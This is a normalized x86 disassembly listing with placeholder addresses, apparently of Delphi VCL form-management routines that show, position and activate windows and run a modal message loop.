mov eax [ eax + 0x44 ]
call sub_44e2b8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_4550b4
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_46bfd0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44e2fc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4550b4
call sub_465538
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_46c00c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44e2b8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_46bfdc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
push r-xdata
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_44eb14
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_46c000
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44e2fc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_46bfd0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_468ba0
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_468ba0
jmp r-xdata
sub_46a801
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46e56c
call sub_403b4c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_46bfdc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44e2b8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_46bfd0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44e2fc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_46c00c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44e2b8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_46bfdc
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ac98
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
push r-xdata
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_44eb14
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_46c000
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_44e2fc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_46bfd0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_468ba0
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_468ba0
jmp r-xdata
sub_46ab9d
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46e56c
call sub_403b4c
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4698f0
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45260c
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_4550b4
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ac98
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4550b4
call sub_465538
mov ebx eax
sub_46ace4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_46ad3c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42492c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46ad9a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40331c
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_46ada8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_403518
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_46add4
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2f4 ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_46e558
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_403518
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_46af74
jmp r-xdata
mov eax ebx
call sub_46b010
mov dl 0x1
mov eax ebx
call sub_468b60
jmp r-xdata
sub_46ae78
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_4684ec
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_468538
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
sub_46aedc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46af48
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_403518
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46b010
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46af94
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46b002
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b009
lea eax [ ebp - 0x4 ]
call sub_404118
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_4697ec
sub_46b02c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46b2f4
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_44d114
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ rw-data ]
call sub_46d4cc
xor edx edx
push ebp
push sub_46b2d7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
xor edx edx
call sub_418d74
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x78 ] edx
mov eax [ rw-data ]
mov ax [ eax + 0x44 ]
mov [ ebp - 0x12 ] ax
xor edx edx
mov eax [ rw-data ]
call sub_46c4fc
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
xor eax eax
call sub_4653e8
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_46b2b5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_46af7c
xor edx edx
push ebp
push sub_46b214
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_46aedc
call GetCapture
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_46e2d8
mov eax [ rw-data ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_4550b4
mov ebx eax
call GetActiveWindow
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b21b
mov eax [ ebp - 0x4 ]
call sub_46af74
retn
xor eax eax
mov [ ebp - 0x1c ] eax
sub_46b21b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b2bf
mov eax [ rw-data ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46c4fc
mov dx [ ebp - 0x12 ]
mov eax [ rw-data ]
call sub_46c4fc
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov eax ebx
call sub_418cf0
mov esi eax
mov eax [ rw-data ]
mov [ eax + 0x78 ] esi
mov edx esi
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
call sub_418e94
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_46549c
mov eax [ rw-data ]
mov ebx [ eax + 0x7c ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xf7
retn
mov eax [ ebp - 0x1c ]
push eax
call SetActiveWindow
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_46b304
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_451de4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46b304
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_451da8
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_46b374
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_46b304
pop ecx
mov eax [ esi + 0x34 ]
call sub_460800
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_460810
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_46b3f8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_453404
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_403518
sub_46b41c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_403518
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_46b44c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_451de4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46b41c
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46b44c
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_451da8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46b4c8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_46b41c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_46b41c
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_46b44c
pop ecx
test al al
je r-xdata
sub_46b51c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_403518
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_46b54c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_451de4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46b51c
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_46b54c
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_451da8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46b5c8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_46b51c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_46b51c
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_46b54c
pop ecx
test al al
je r-xdata
sub_46b61c
push ebp
mov ebp esp
push ebx
push esi
